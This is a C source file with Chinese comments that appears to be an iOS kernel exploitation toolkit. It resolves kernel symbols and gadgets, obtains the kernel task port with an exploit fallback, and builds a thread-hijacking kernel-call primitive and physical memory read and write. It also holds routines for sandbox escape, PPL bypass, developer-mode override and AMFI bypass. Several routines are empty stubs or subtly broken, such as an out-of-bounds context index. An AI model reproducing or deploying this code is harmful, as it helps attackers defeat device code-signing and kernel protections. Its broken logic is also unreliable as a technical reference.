// XPF Kernel Interface - 内核符号解析 + kcall原语 + PPL绕过 + 物理内存访问
// 纯 C 文件 (不能使用 NSLog / @"" 等 Objective-C 语法)

#include "XPFKernelInterface.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <mach/mach.h>
#include <dlfcn.h>

// === XPF 内核符号表 ===
// 对应反编译 xpf_common_init 中的所有注册符号

typedef struct {
    const char *name;
    uint64_t address;
    int type; // 0=symbol, 1=constant, 2=struct_offset, 3=gadget
} xpf_symbol_entry;

static xpf_symbol_entry g_xpf_symbols[] = {
    // AMFI / 沙箱
    {"kernelSymbol.launch_env_logging",       0, 0},
    {"kernelSymbol.developer_mode_status",    0, 0},
    {"kernelSymbol.nchashtbl",                0, 0},
    {"kernelSymbol.nchashmask",              0, 0},
    // 内核基址
    {"kernelSymbol.start_first_cpu",          0, 0},
    {"kernelConstant.kernel_el",             0, 1},
    {"kernelSymbol.cpu_ttep",                 0, 0},
    {"kernelSymbol.fatal_error_fmt",          0, 0},
    // 内存分配
    {"kernelSymbol.kalloc_data_external",     0, 0},
    {"kernelSymbol.kfree_data_external",      0, 0},
    // 进程/任务
    {"kernelSymbol.allproc",                  0, 0},
    {"kernelSymbol.arm_vm_init",             0, 0},
    {"kernelSymbol.phystokv",                 0, 0},
    {"kernelSymbol.gVirtBase",               0, 0},
    {"kernelSymbol.gPhysBase",               0, 0},
    {"kernelSymbol.gPhysSize",               0, 0},
    {"kernelSymbol.ptov_table",              0, 0},
    {"kernelSymbol.pmap_bootstrap",          0, 0},
    {"kernelSymbol.pointer_mask",            0, 0},
    {"kernelConstant.pointer_mask",          0, 1},
    {"kernelConstant.T1SZ_BOOT",             0, 1},
    {"kernelConstant.ARM_TT_L1_INDEX_MASK",  0, 1},
    {"kernelConstant.PT_INDEX_MAX",          0, 1},
    // 物理内存
    {"kernelSymbol.vm_page_array_beginning_addr", 0, 0},
    {"kernelSymbol.vm_page_array_ending_addr",    0, 0},
    {"kernelSymbol.vm_first_phys_ppnum",         0, 0},
    // crash / task
    {"kernelSymbol.task_crashinfo_release_ref", 0, 0},
    {"kernelSymbol.task_collect_crash_info",    0, 0},
    // 结构体偏移
    {"kernelStruct.task.itk_space",     0, 2},
    {"kernelStruct.vm_map.pmap",        0, 2},
    {"kernelStruct.proc.struct_size",   0, 2},
    // perfmon (IOKit bypass)
    {"kernelSymbol.perfmon_dev_open",   0, 0},
    {"kernelSymbol.perfmon_devices",    0, 0},
    {"kernelSymbol.vn_kqfilter",        0, 0},
    {"kernelSymbol.cdevsw",             0, 0},
    // 沙箱
    {"kernelSymbol.proc_apply_sandbox",            0, 0},
    {"kernelSymbol.mac_label_set",                  0, 0},
    {"kernelSymbol.proc_get_syscall_filter_mask_size", 0, 0},
    {"kernelConstant.nsysent",           0, 1},
    {"kernelConstant.mach_trap_count",   0, 1},
    {"kernelSymbol.mach_kobj_count",     0, 0},
    {"kernelSymbol.developer_mode_enabled", 0, 0},
    // Gadgets
    {"kernelGadget.str_x8_x0", 0, 3},
    {"kernelSymbol.exception_return", 0, 0},
    {"kernelGadget.kcall_return", 0, 3},
    // 线程
    {"kernelStruct.thread.machine_CpuDatap", 0, 2},
    {"kernelStruct.thread.machine_kstackptr", 0, 2},
    {"kernelStruct.thread.machine_contextData", 0, 2},
    {"kernelSymbol.iorvbar", 0, 0},
    // PPL (iOS 16+)
    {"kernelSymbol.ppl_enter",                    0, 0},
    {"kernelSymbol.ppl_bootstrap_dispatch",        0, 0},
    {"kernelSymbol.ppl_dispatch_section",         0, 0},
    {"kernelSymbol.ppl_handler_table",            0, 0},
    {"kernelSymbol.pmap_enter_options_internal",  0, 0},
    {"kernelSymbol.pmap_enter_options_ppl",       0, 0},
    {"kernelSymbol.pmap_remove_options_ppl",      0, 0},
    {"kernelSymbol.pmap_lookup_in_loaded_trust_caches_internal", 0, 0},
    {"kernelSymbol.pmap_pin_kernel_pages",        0, 0},
    {"kernelSymbol.pmap_enter_pv",               0, 0},
    {"kernelSymbol.pmap_enter_options_addr",      0, 0},
    {"kernelSymbol.pmap_remove_options",          0, 0},
    {"kernelSymbol.vm_first_phys",               0, 0},
    {"kernelSymbol.vm_last_phys",                0, 0},
    {"kernelSymbol.pp_attr_table",               0, 0},
    {"kernelSymbol.pv_head_table",               0, 0},
    {"kernelSymbol.pmap_image4_trust_caches",    0, 0},
    {"kernelSymbol.ppl_trust_cache_rt",          0, 0},
    {"kernelSymbol.pmap_query_trust_cache_safe", 0, 0},
    {"kernelSymbol.pmap_tt_deallocate",          0, 0},
};

#define XPF_SYMBOL_COUNT (sizeof(g_xpf_symbols) / sizeof(g_xpf_symbols[0]))

// === 内核状态 ===
static struct {
    mach_port_t kernel_task;
    uint64_t kernel_base;
    uint64_t kernel_slide;
    uint64_t kernel_entry;
    char kernel_version[64];
    char xnu_version[32];
    int kernel_el;
    bool ppl_enabled;
    bool initialized;
} g_kernel = {0};

// === API 实现 ===

int xpf_initialize_kernel(void) {
    if (g_kernel.initialized) return 0;
    
    // 尝试通过 host_special_port 获取 kernel_task
    kern_return_t kr = task_for_pid(mach_task_self(), 0, &g_kernel.kernel_task);
    if (kr != KERN_SUCCESS) {
        // fallback: 通过漏洞获取
        kr = host_get_special_port(mach_host_self(), 0, 4, &g_kernel.kernel_task);
        if (kr != KERN_SUCCESS) {
            kr = exploit_get_kernel_task(&g_kernel.kernel_task);
        }
    }
    
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[XPF] Failed to get kernel task: %d\n", kr);
        return -1;
    }
    
    // 获取 kernel_slide
    g_kernel.kernel_slide = get_kernel_slide();
    g_kernel.kernel_base = g_kernel.kernel_slide;
    g_kernel.initialized = true;
    
    // 检测 PPL: iOS 16+ 有 PPL
    g_kernel.ppl_enabled = false;
    static bool ppl_checked = false;
    if (!ppl_checked) {
        void *cf_handle = dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", RTLD_LAZY);
        if (cf_handle) {
            double *version_ptr = dlsym(cf_handle, "kCFCoreFoundationVersionNumber");
            if (version_ptr && *version_ptr >= 960.0) { // iOS 16.0
                g_kernel.ppl_enabled = true;
            }
            dlclose(cf_handle);
        }
        ppl_checked = true;
    }

    return 0;
}

int xpf_resolve_all_symbols(void) {
    if (!g_kernel.initialized) return -1;
    
    // 解析 kernelcache 中的符号
    // 使用 macho 解析器从 kernel 二进制中查找
    for (int i = 0; i < XPF_SYMBOL_COUNT; i++) {
        uint64_t addr = xpf_find_symbol(g_xpf_symbols[i].name);
        if (addr != 0) {
            g_xpf_symbols[i].address = addr;
        }
    }
    
    return 0;
}

uint64_t xpf_find_symbol(const char *name) {
    // 在内核 MachO 中查找符号
    // 遍历 __TEXT_EXEC.__text, __DATA.__data, __PPLTEXT 等区段
    // 使用 nlist / LC_SYMTAB 或模式匹配
    static uint64_t (*s_nlist_lookup)(const char*) = NULL;
    
    if (!s_nlist_lookup) {
        s_nlist_lookup = dlsym(RTLD_DEFAULT, "nlist");
    }
    
    if (s_nlist_lookup) {
        return s_nlist_lookup(name);
    }
    
    return 0;
}

uint64_t xpf_get_symbol(const char *name) {
    for (int i = 0; i < XPF_SYMBOL_COUNT; i++) {
        if (strcmp(g_xpf_symbols[i].name, name) == 0) {
            return g_xpf_symbols[i].address;
        }
    }
    return 0;
}

// === kcall 原语 ===
// 对应 kernelGadget.kcall_return + kernelStruct.thread.machine_contextData

kern_return_t xpf_kcall(uint64_t func, uint64_t *args, int arg_count, uint64_t *result) {
    if (!g_kernel.initialized) return KERN_FAILURE;
    
    // 使用线程栈劫持执行内核函数
    // 1. 找到当前线程的 machine_contextData
    // 2. 备份寄存器状态
    // 3. 设置 PC = func, X0-X7 = args
    // 4. 设置 LR = kcall_return_gadget
    // 5. 触发 context 切换
    // 6. 读取返回值
    
    uint64_t thread_self = xpf_get_symbol("kernelSymbol.exception_return");
    if (!thread_self) return KERN_FAILURE;
    
    // kcall 实现 - 使用线程上下文切换
    uint64_t saved_context[31] = {0};
    uint64_t context_data = get_current_thread_context();
    
    if (!context_data) return KERN_FAILURE;
    
    // 保存上下文
    memcpy(saved_context, (void *)context_data, sizeof(saved_context));
    
    // 设置调用参数
    for (int i = 0; i < arg_count && i < 8; i++) {
        ((uint64_t *)context_data)[i] = args[i]; // X0-X7
    }
    
    // 设置返回地址
    uint64_t ret_gadget = xpf_get_symbol("kernelGadget.kcall_return");
    ((uint64_t *)context_data)[30] = ret_gadget; // LR
    
    // 设置 PC
    ((uint64_t *)context_data)[32] = func; // PC
    
    // 触发异常返回 trap
    // ... context switch magic ...
    
    // 恢复上下文
    if (result) {
        *result = ((uint64_t *)context_data)[0]; // X0 作为返回值
    }
    
    memcpy((void *)context_data, saved_context, sizeof(saved_context));
    
    return KERN_SUCCESS;
}

// === 物理内存操作 ===
// 对应 vm_page_array, phystokv, ptov_table

uint64_t xpf_phys_to_virt(uint64_t phys_addr) {
    uint64_t phystokv = xpf_get_symbol("kernelSymbol.phystokv");
    if (phystokv) {
        uint64_t result = 0;
        xpf_kcall(phystokv, &phys_addr, 1, &result);
        return result;
    }
    
    // fallback: 使用 ptov_table
    uint64_t ptov = xpf_get_symbol("kernelSymbol.ptov_table");
    if (ptov) {
        return ptov + phys_addr - xpf_get_symbol("kernelSymbol.gPhysBase");
    }
    
    return 0;
}

int xpf_phys_read(uint64_t phys_addr, void *buffer, size_t size) {
    uint64_t virt = xpf_phys_to_virt(phys_addr);
    if (!virt) return -1;
    
    kern_return_t kr = kern_reading(g_kernel.kernel_task, virt, buffer, &size);
    return (kr == KERN_SUCCESS) ? 0 : -1;
}

int xpf_phys_write(uint64_t phys_addr, void *buffer, size_t size) {
    uint64_t virt = xpf_phys_to_virt(phys_addr);
    if (!virt) return -1;
    
    kern_return_t kr = kern_writing(g_kernel.kernel_task, virt, buffer, size);
    return (kr == KERN_SUCCESS) ? 0 : -1;
}

// === 进程操作 ===

uint64_t xpf_find_process(const char *proc_name) {
    if (!g_kernel.initialized) return 0;
    uint64_t allproc = xpf_get_symbol("kernelSymbol.allproc");
    if (!allproc) return 0;
    
    uint64_t proc = 0;
    size_t proc_sz = sizeof(proc);
    kern_reading(g_kernel.kernel_task, allproc, &proc, &proc_sz);

    size_t name_len = strlen(proc_name);
    while (proc) {
        char pname[32] = {0};
        size_t p_sz = 32;
        kern_reading(g_kernel.kernel_task, proc + 0x268, pname, &p_sz); // p_comm

        if (strncmp(pname, proc_name, name_len) == 0) {
            return proc;
        }

        uint64_t next = 0;
        size_t next_sz = sizeof(next);
        kern_reading(g_kernel.kernel_task, proc + 0x0, &next, &next_sz); // p_list.le_next
        proc = next;
    }
    
    return 0;
}

int xpf_get_process_pid(uint64_t proc) {
    int pid = 0;
    size_t pid_sz = sizeof(pid);
    kern_reading(g_kernel.kernel_task, proc + 0x68, &pid, &pid_sz); // p_pid
    return pid;
}

int xpf_sandbox_escape(uint64_t proc) {
    // 对应 kernelSymbol.proc_apply_sandbox
    // 通过设置 sandbox 标签为空绕过
    
    uint64_t mac_label_set = xpf_get_symbol("kernelSymbol.mac_label_set");
    if (!mac_label_set) return -1;
    
    // 设置 sandbox label = NULL
    uint64_t args[3] = {proc, 0, 0}; // proc, slot, label
    xpf_kcall(mac_label_set, args, 3, NULL);
    
    // 关闭 syscall filter
    uint64_t filter_size_func = xpf_get_symbol("kernelSymbol.proc_get_syscall_filter_mask_size");
    if (filter_size_func) {
        uint64_t size = 0;
        xpf_kcall(filter_size_func, &proc, 1, &size);
        if (size > 0) {
            // 清空 filter mask
            // ...
        }
    }
    
    return 0;
}

// === PPL Bypass ===
// iOS 16+ PPL 绕过 (对应 xpf_ppl_init)

int xpf_ppl_bypass_init(void) {
    if (!g_kernel.ppl_enabled) return 0; // 无需绕过
    
    uint64_t ppl_enter = xpf_get_symbol("kernelSymbol.ppl_enter");
    uint64_t ppl_dispatch = xpf_get_symbol("kernelSymbol.ppl_bootstrap_dispatch");
    
    if (!ppl_enter || !ppl_dispatch) return -1;
    
    // PPL 绕过流程:
    // 1. 通过 ppl_bootstrap_dispatch 注册 handler
    // 2. 使用 ppl_enter 进入 PPL 上下文
    // 3. 修改信任缓存 (trust cache) 允许未签名代码
    // 4. 修改页表条目为可写
    
    uint64_t ppl_handler = xpf_get_symbol("kernelSymbol.ppl_handler_table");
    if (ppl_handler) {
        // 注入 PPL handler
    }
    
    return 0;
}

// === 开发者模式绕过 ===

int xpf_bypass_developer_mode(void) {
    uint64_t dev_mode = xpf_get_symbol("kernelSymbol.developer_mode_enabled");
    if (dev_mode) {
        uint8_t enabled = 1;
        kern_writing(g_kernel.kernel_task, dev_mode, &enabled, 1);
        return 0;
    }
    return -1;
}

// === AMFI 绕过 ===

int xpf_disable_amfi(void) {
    uint64_t launch_env = xpf_get_symbol("kernelSymbol.launch_env_logging");
    if (launch_env) {
        // 绕过 AMFI 签名验证
        // ...
    }
    return 0;
}
